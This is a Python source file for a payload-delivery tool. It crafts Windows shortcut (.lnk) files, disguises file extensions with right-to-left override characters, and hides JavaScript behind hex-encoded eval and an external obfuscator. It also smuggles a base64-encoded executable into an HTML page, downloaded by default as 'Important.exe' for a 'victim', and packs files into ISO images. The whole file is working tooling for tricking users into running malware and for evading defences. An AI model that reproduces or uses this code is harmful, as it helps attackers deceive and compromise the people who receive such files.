import os, sys, shutil, subprocess, base64
import shutil
import tempfile
from jsmin import jsmin
import pylnk3
import argparse
from datetime import datetime


def create_lnk(name, target, mode, args, description, icon, workingDir, is_dir=False):

    if len(name) < 4 or name[-4:] != ".lnk":
        name = "{0}.lnk".format(name)

    target = target.replace("/", "\\").rstrip("\\").split("\\")
    target_file = target[-1]
    target_drive = target[0]

    if icon is not None:
        icon = icon.replace("/", "\\").rstrip("\\")

    lnk = populate_lnk(name, target, mode, args, description, icon, workingDir)
    levels = list(pylnk3.path_levels("\\".join(target)))
    elements = [
        pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
        pylnk3.DriveEntry(target_drive),
    ]
    for level in target:
        entry = build_entry(level)
        elements.append(entry)
    entry = build_entry(target_file)
    if not is_dir:
        entry.type = pylnk3.TYPE_FILE
    elements.append(entry)

    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    write_lnk(lnk)

    return 0


def populate_lnk(name, target, mode, args, description, icon, workingDir):
    lnk = pylnk3.create(name)
    lnk.specify_local_location("\\".join(target))

    lnk._link_info.size_local_volume_table = 0
    lnk._link_info.volume_label = ""
    lnk._link_info.drive_serial = 0
    lnk._link_info.local = True
    lnk.window_mode = mode
    if args is not None:
        lnk.arguments = args
    if description is not None:
        lnk.description = description
    if icon is not None:
        lnk.icon = icon
        lnk.icon_index = 13

    lnk._link_info.local_base_path = target
    if workingDir is not None:
        workingDir = workingDir.replace("/", "\\").rstrip("\\").split("\\")
        lnk.working_dir = "{0}\\".format("\\".join(workingDir))
        relative_path = target
        relative_path.pop()
        lnk.relative_path = "{0}\\".format("\\".join(relative_path))
    else:
        working_dir = target
        working_dir.pop()
        lnk.working_dir = "{0}\\".format("\\".join(working_dir))

    return lnk


def build_entry(name):
    entry = pylnk3.PathSegmentEntry()
    entry.type = pylnk3.TYPE_FOLDER
    entry.file_size = 0

    n = datetime.now()
    entry.modified = n
    entry.created = n
    entry.accessed = n

    entry.short_name = name
    entry.full_name = entry.short_name

    return entry


def write_lnk(lnk):
    with open(lnk.file, "wb") as f:
        lnk.write(f)


def check_template_files(html_template_path, js_template_path):
    """
    Verifies that the required template files exist in the template directory.

    :param template_dir: The directory containing the template files.
    """

    if not os.path.isfile(js_template_path):
        print(f"Javascript template file '{js_template_path}' not found.")
        sys.exit(1)

    if not os.path.isfile(html_template_path):
        print(f"HTML template file '{html_template_path}' not found.")
        sys.exit(1)


def create_rtlo_file(input_file, output_directory, spoofed_extension):
    filename, extension = os.path.splitext(os.path.abspath(input_file))
    reverse = spoofed_extension[::-1]
    newname = os.path.join(
        output_directory, f"{os.path.basename(filename)}\u202e{reverse}{extension}"
    )

    if os.path.isfile(newname):
        # print("[i] Removing old file: {}".format(newname))
        os.remove(newname)

    try:
        shutil.copy(input_file, newname)
    except Exception as e:
        print("[!] Error during spoofing extension using RTLO: {}".format(e))
        sys.exit(1)

    return os.path.abspath(newname)


class JavaScriptObfuscator:
    def __init__(self):
        self.obfuscator_path = self._find_obfuscator()

    def _find_obfuscator(self):
        obfuscator_path = shutil.which("javascript-obfuscator")
        if not obfuscator_path:
            raise FileNotFoundError(
                "[!] javascript-obfuscator not found in system PATH."
            )
        return obfuscator_path

    @staticmethod
    def _convert_to_hex_encoded_eval(code):
        return "window['\\x65\x76\\x61\\x6C']('{}')".format(
            "".join("\\x{:02x}".format(ord(c)) for c in code)
        )

    def obfuscate(self, code):
        try:
            # Step 1: Convert the JS code to hex-encoded eval
            hex_encoded_code = self._convert_to_hex_encoded_eval(code)

            # Step 2: Create a temporary JavaScript file with the code
            with tempfile.NamedTemporaryFile(suffix=".js", delete=False) as temp_file:
                temp_file_path = temp_file.name
                temp_file.write(hex_encoded_code.encode("utf-8"))

            output_path = temp_file_path.replace(".js", "_obfuscated.js")

            try:
                # Step 3: Obfuscate the JavaScript code using the external tool
                subprocess.run(
                    [
                        self.obfuscator_path,
                        os.path.abspath(temp_file_path),
                        "--output",
                        os.path.abspath(output_path),
                    ],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=True,
                )

                # Step 4: Read the obfuscated code from the output file
                with open(output_path, "r") as output_file:
                    obfuscated_code = output_file.read()

                return obfuscated_code

            except subprocess.CalledProcessError as e:
                print(f"[!] Obfuscation process failed: {e.stderr}")
                return None
            except Exception as e:
                print(f"[!] Unexpected error during obfuscation: {e}")
                return None
            finally:
                # Clean up temporary files
                self._cleanup_files(temp_file_path, output_path)

        except FileNotFoundError as fnfe:
            print(f"{fnfe}")
            return None
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            return None

    @staticmethod
    def _cleanup_files(temp_file_path, output_path):
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
        if os.path.exists(output_path):
            os.remove(output_path)


def generate_html_payload(
    template_directory,
    executable_path,
    html_template_path,
    js_template_path,
    output_filename,
    download_as_filename="Important.exe",
):
    # Check if the template directory exists
    if not os.path.exists(template_directory):
        print(f"Template directory '{template_directory}' not found.")
        sys.exit(1)

    # Ensure the necessary template files exist
    check_template_files(html_template_path, js_template_path)

    try:
        # Read the binary data from the executable file
        with open(executable_path, "rb") as exe_file:
            binary_data = exe_file.read()
    except FileNotFoundError:
        print(f"[!] Executable file '{executable_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading '{executable_path}': {e}")
        sys.exit(1)

    # Base64 encode the binary data
    encoded_data = base64.b64encode(binary_data).decode("utf-8")

    try:
        # Read the HTML and JS templates
        with open(html_template_path, "r") as html_template_file:
            html_template_content = html_template_file.read()
        with open(js_template_path, "r") as js_template_file:
            js_template_content = js_template_file.read()
    except FileNotFoundError as e:
        print(f"[!] Template file '{e.filename}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading template file: {e}")
        sys.exit(1)

    # Replace placeholders in the template with the encoded data and the victim filename
    js_content = js_template_content.replace("{encoded_data}", encoded_data)
    js_content = js_content.replace("{filename}", download_as_filename)

    # Obfuscate the JavaScript content
    minified_js_content = jsmin(js_content)
    obfuscator = JavaScriptObfuscator()
    obfuscated_js_content = obfuscator.obfuscate(minified_js_content)

    html_content = html_template_content.replace(
        "{JAVASCRIPT_CONTENT_GOES_HERE}", obfuscated_js_content
    )

    try:
        # Write the modified HTML content to the output file
        with open(output_filename, "w") as output_file:
            output_file.write(html_content)
    except Exception as e:
        print(f"[!] Error writing to '{output_filename}': {e}")
        sys.exit(1)

    print(
        f"[#] HTML file '{str(os.path.basename(output_filename))}' generated successfully."
    )


def generate_iso_file(filename):
    iso_path = os.path.join(os.path.dirname(__file__), "payload.iso")
    if os.path.isfile(os.path.abspath(iso_path)):
        os.remove(iso_path)
    script_path = os.path.join(os.path.dirname(__file__), "scripts", "New-IsoFile.ps1")
    command = f'New-IsoFile -Path "{iso_path}" "{filename}"'
    ps_command = f'Import-Module "{script_path}"; {command}'
    result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", ps_command],
        capture_output=True,
        text=True,
    )
    if not result.returncode == 0:
        print(f"[!] Error: {result.stderr}")

    print(f"[#] ISO file '{iso_path}' created successfully.")
    print(result.stdout)
